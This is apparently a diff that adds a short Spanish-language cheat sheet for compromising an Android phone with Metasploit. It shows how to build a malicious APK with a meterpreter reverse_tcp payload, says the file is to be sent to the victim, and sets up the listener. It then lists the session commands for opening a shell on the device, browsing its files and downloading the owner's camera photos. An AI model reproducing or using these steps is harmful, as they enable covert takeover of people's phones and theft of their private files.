@@ -1,0 +1,42 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=/IPMaquinaAtacante/ LPORT=/555/PUERTO// R > /root/Escritorio/Salida.apk/donde guardar/
+
+El archivo que cree lo tengo que enviar a la victima
+----------------------------------------------------------
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST ip
+set LPORT puerto
+exploit -j
+
+se prepara para cuando la aplicacion se este por instalar
+---------------------------------------------------------
+msfconsole -r Android.rc
+
+Por si lo tengo en un script asi lo corro
+
+UNA VEZ INICIE
+
+sessions
+-------------------------------
+Indica las sesiones iniciadas
+
+sessions -i 1/Numero de Sesion/
+------------------------------------
+help
+
+todos los comandos a usar
+----------------------------
+shell
+
+ingreso al dispositivo
+----------------------------
+ls
+
+muestra todos los archivos
+----------------------------------
+exit
+download /sdcard/DCIM/Camera/archivo /direccion referencial/
+
+para descargar archivos
+
+
